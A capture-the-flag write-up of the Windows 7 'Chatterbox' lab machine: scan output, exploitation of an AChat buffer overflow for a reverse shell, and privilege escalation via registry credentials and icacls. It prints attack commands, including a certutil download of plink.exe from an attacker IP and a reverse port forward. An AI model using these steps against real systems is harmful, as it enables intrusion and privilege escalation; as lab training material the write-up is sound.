## Initial Enumeration

```
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
9255/tcp open  http    AChat chat system httpd
|_http-title: Site doesn't have a title.
|_http-server-header: AChat
9256/tcp open  achat   AChat chat system
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
```

### SMB Enumeration

```
Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2025-03-16T07:26:01
|_  start_date: 2025-03-14T12:50:01
|_clock-skew: mean: 6h20m04s, deviation: 2h18m36s, median: 5h00m02s
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Chatterbox
|   NetBIOS computer name: CHATTERBOX\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-03-16T03:26:02-04:00

```


### Additional Information

- [SpeedGuide Port 9256](https://www.speedguide.net/port.php?port=9256)

![](Images/Pasted%20image%2020250315223211.png)

## Exploitation

We will follow the instructions in the exploit-db post to modify the Python code with the buffer generated via `msfvenom`.

[Exploit: AChat chat system remote command execution](https://www.exploit-db.com/exploits/36025)

### Update the Buffer and Write Pointer Address

Update the buffer with the necessary values and add the write pointer address for the target machine.

![](Images/Pasted%20image%2020250315230224.png)

![](Images/Pasted%20image%2020250315230254.png)

### Setting Up NC Listener and Running the Exploit

We need to set up our Netcat (NC) listener and run the code using Python 2 due to the exploit’s syntax.

![](Images/Pasted%20image%2020250315230337.png)

![](Images/Pasted%20image%2020250315230344.png)

After running the exploit, we successfully gain a shell on the target host as the user `alfred`.

**Note**: Chatterbox is a tough machine, as failing the exploit causes the machine to require a restart.

## Post Exploitation

Now that we have a normal-level user on the system, we can begin enumerating for possible privilege escalation.

### Grab User Flag

First, we can quickly grab the user flag from the desktop.

![](Images/Pasted%20image%2020250315231006.png)

Flag:  
`d20c433812e9b5d408ecccd2d62c4631`

### Finding Administrator Flag

Since we don't have permissions to read the admin flag, let's continue enumeration.

![](Images/Pasted%20image%2020250315231053.png)

After further enumeration, we discover credentials for the `Administrator` account in the registry. Since this is a CTF, we will assume these credentials are valid and attempt to use them to establish a session.

### Double-Checking Credentials with `netexec`

We verify the credentials are correct using `netexec`.

![](Images/Pasted%20image%2020250315233619.png)

### Two Pathways for Obtaining the Admin Flag

#### 1. **Permission Misconfiguration**

We can see that although `alfred` doesn’t have direct access to read the file, they have full control over the directory and its respective files.

- `(I)` means **Inherited** permissions.
- `(OI)` stands for **Object Inherit**, which applies permissions to files within the directory.
- `(CI)` stands for **Container Inherit**, which applies permissions to subdirectories of the current directory.
- `(F)` stands for **Full Control**, meaning **SYSTEM** has full rights to the directory and its contents.

We can modify the permissions on the `root.txt` file using `alfred` to read the flag.

Command to grant full control to `alfred` on `root.txt`:

`icacls root.txt /grant CHATTERBOX\Alfred:(F)`

![](Images/Pasted%20image%2020250315234838.png)

We can now read the root flag. This wasn’t likely the intended solution, as we didn’t "root" the box, so we will also attempt to generate a full administrative shell.

#### 2. **Spawning an Admin Shell via Port Forwarding**

We need to send `plink.exe` to the victim machine to start establishing the port forwarding.

Using `certutil` to download `plink.exe`:

`certutil -urlcache -f http://10.10.14.13/plink.exe plink.exe`

![](Images/Pasted%20image%2020250315235951.png)

![](Images/Pasted%20image%2020250316000138.png)

Now that `plink.exe` is on the victim machine, we establish a connection using:

`plink.exe -l root -pw kali -R 445:127.0.0.1:445 10.10.14.13 -P 2222`
![](Images/Pasted%20image%2020250316003043.png)
### Verifying the Connection with `netstat`

Check the connection:

`netstat -tuln`

![](Images/Pasted%20image%2020250316002534.png)

We have successfully established the connection. Now we can interact with the host remotely.

### Running `winexe` to Open Admin Shell

Using `winexe` to open a new command prompt as Administrator. Although this shell isn’t the best, it gets the job done.

![](Images/Pasted%20image%2020250316002702.png)

---
